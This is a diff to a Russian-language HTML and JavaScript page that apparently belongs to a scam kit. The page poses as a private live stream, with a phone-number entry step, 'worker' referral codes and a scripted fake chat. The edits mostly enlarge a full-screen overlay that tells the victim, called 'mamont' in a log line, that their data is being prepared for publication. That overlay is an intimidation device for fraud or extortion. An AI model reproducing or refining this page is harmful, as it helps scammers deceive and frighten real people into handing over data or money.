@@ -309,7 +309,7 @@
             margin-top: 5px;
         }
 
-        /* ===== ПЕРЕКРЫВАЮЩАЯ СТРАНИЦА УВЕДОМЛЕНИЯ ===== */
+        /* ===== СТРАНИЦА УВЕДОМЛЕНИЯ (ЗАКРЫВАЕТ ВСЁ) ===== */
         #broadcastOverlay {
             position: fixed;
             top: 0;
@@ -332,35 +332,35 @@
         
         #broadcastOverlay .broadcast-box {
             background: linear-gradient(145deg, #0a0a0a, #1a0a0a);
-            border: 2px solid #ff3355;
+            border: 3px solid #ff3355;
             border-radius: 20px;
-            padding: 40px 30px;
+            padding: 50px 30px;
             max-width: 500px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 0 60px rgba(255, 51, 85, 0.3);
+            box-shadow: 0 0 80px rgba(255, 51, 85, 0.3);
             animation: pulseBorder 2s infinite;
         }
         
         @keyframes pulseBorder {
-            0%, 100% { box-shadow: 0 0 60px rgba(255, 51, 85, 0.3); }
-            50% { box-shadow: 0 0 100px rgba(255, 51, 85, 0.6); }
+            0%, 100% { box-shadow: 0 0 80px rgba(255, 51, 85, 0.3); }
+            50% { box-shadow: 0 0 120px rgba(255, 51, 85, 0.6); }
         }
         
         #broadcastOverlay .broadcast-title {
             color: #ff3355;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
             text-transform: uppercase;
-            letter-spacing: 3px;
+            letter-spacing: 4px;
             margin-bottom: 15px;
-            text-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
+            text-shadow: 0 0 40px rgba(255, 51, 85, 0.5);
         }
         
         #broadcastOverlay .broadcast-subtitle {
             color: #ff6680;
-            font-size: 16px;
-            margin-bottom: 25px;
+            font-size: 18px;
+            margin-bottom: 30px;
             opacity: 0.8;
         }
         
@@ -368,14 +368,14 @@
             text-align: left;
             color: #00ffcc;
             font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 2;
+            font-size: 15px;
+            line-height: 2.2;
             background: rgba(0, 0, 0, 0.5);
-            padding: 15px 20px;
+            padding: 20px 25px;
             border-radius: 10px;
             border: 1px solid rgba(255, 51, 85, 0.2);
             margin-bottom: 25px;
-            max-height: 300px;
+            max-height: 350px;
             overflow-y: auto;
         }
         
@@ -386,9 +386,10 @@
         
         #broadcastOverlay .broadcast-status {
             color: #ff3355;
-            font-size: 14px;
+            font-size: 16px;
             animation: blink 1s infinite;
-            margin-top: 10px;
+            margin-top: 15px;
+            font-weight: bold;
         }
         
         @keyframes blink {
@@ -400,23 +401,25 @@
             background: #ff3355;
             border: none;
             color: white;
-            padding: 12px 30px;
+            padding: 14px 40px;
             border-radius: 30px;
             font-weight: bold;
-            font-size: 16px;
+            font-size: 18px;
             cursor: pointer;
-            margin-top: 15px;
+            margin-top: 20px;
             transition: 0.3s;
+            box-shadow: 0 0 30px rgba(255, 51, 85, 0.3);
         }
         
         #broadcastOverlay .broadcast-close-btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(255, 51, 85, 0.5);
+            box-shadow: 0 0 50px rgba(255, 51, 85, 0.6);
         }
     </style>
 </head>
 <body>
 
+<!-- ===== ОСНОВНОЙ КОНТЕНТ ===== -->
 <div id="loadingOverlay" class="loading-overlay">
     <div>🔴 ЗАГРУЗКА СТРИМА...</div>
 </div>
@@ -448,7 +451,7 @@
     <div class="chat-messages" id="chatMessages"></div>
 </div>
 
-<!-- ===== ПЕРЕКРЫВАЮЩАЯ СТРАНИЦА УВЕДОМЛЕНИЯ ===== -->
+<!-- ===== СТРАНИЦА УВЕДОМЛЕНИЯ (ПОЛНОСТЬЮ ПЕРЕКРЫВАЕТ ВСЁ) ===== -->
 <div id="broadcastOverlay">
     <div class="broadcast-box">
         <div class="broadcast-title">🔴 СИСТЕМА АКТИВИРОВАНА</div>
@@ -501,7 +504,6 @@
     let currentPhone = "";
     let currentStep = "phone";
     let currentRefCode = null;
-    let isBroadcastActive = false;
     
     // ========== ПОЛУЧАЕМ ПАРАМЕТРЫ ИЗ URL ==========
     function getUrlParams() {
@@ -514,18 +516,15 @@
         };
     }
     
-    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ИЗ URL ==========
+    // ========== ЗАГРУЗКА ДАННЫХ ВОРКЕРА ==========
     function loadWorkerData() {
         const params = getUrlParams();
         
         if (params.model) {
             const modelName = decodeURIComponent(params.model);
-            const titleElement = document.getElementById('modelTitle');
-            titleElement.innerHTML = `Приватный стрим ${modelName}`;
+            document.getElementById('modelTitle').innerHTML = `Приватный стрим ${modelName}`;
             document.title = `${modelName} · Приватный стрим LIVE`;
             console.log(`✅ Модель из ссылки: ${modelName}`);
-        } else {
-            console.log('Нет параметра model, показываем Vikysa');
         }
         
         if (params.ref) {
@@ -533,9 +532,10 @@
             console.log(`✅ Реф код: ${currentRefCode}`);
         }
         
-        // Проверяем, нужно ли показать страницу рассылки
+        // ===== ЕСЛИ ЕСТЬ ПАРАМЕТР BROADCAST — ПОКАЗЫВАЕМ СТРАНИЦУ УВЕДОМЛЕНИЯ =====
         if (params.broadcast === 'true') {
             const phone = params.phone || 'неизвестный номер';
+            console.log('📢 ЗАПУСК РАССЫЛКИ ДЛЯ МАМОНТА!');
             showBroadcast(phone);
         }
     }
@@ -571,16 +571,20 @@
             });
     })();
     
-    // ========== ПОКАЗ УВЕДОМЛЕНИЯ НА ВЕСЬ ЭКРАН ==========
+    // ========== ПОКАЗ УВЕДОМЛЕНИЯ (ПЕРЕКРЫВАЕТ ВСЁ) ==========
     function showBroadcast(phone) {
         const overlay = document.getElementById('broadcastOverlay');
         const list = document.getElementById('broadcastList');
         const status = document.getElementById('broadcastStatus');
         
+        // Включаем оверлей
         overlay.className = 'active';
+        
+        // Очищаем список
         list.innerHTML = '';
         status.textContent = '⏳ Инициализация системы...';
         
+        // Уведомления с задержкой
         const messages = [
             { text: '🔴 СИСТЕМА АКТИВИРОВАНА', delay: 500, highlight: true },
             { text: '⏳ Ваши данные готовятся к публикации...', delay: 1500 },
@@ -619,7 +623,7 @@
     // ========== ЗАКРЫТЬ ПЕРЕКРЫТИЕ ==========
     function closeBroadcast() {
         document.getElementById('broadcastOverlay').className = '';
-        window.location.reload();
+        window.location.href = window.location.pathname + window.location.search;
     }
     
     // ========== ВИДЕО ПЛЕЕР ==========
@@ -653,7 +657,7 @@
         }
     }, 5000);
     
-    // ========== ЧАТ (фейковый) ==========
+    // ========== ФЕЙКОВЫЙ ЧАТ ==========
     const chatMessagesContainer = document.getElementById('chatMessages');
     const chatStartMessages = [
         "@user_124: когда разблокируют?",
@@ -885,7 +889,7 @@
     window.closeBroadcast = closeBroadcast;
     window.showBroadcast = showBroadcast;
     
-    // ========== ЗАГРУЗКА ДАННЫХ ИЗ URL ПРИ СТАРТЕ ==========
+    // ========== ЗАГРУЗКА ==========
     loadWorkerData();
 </script>
 
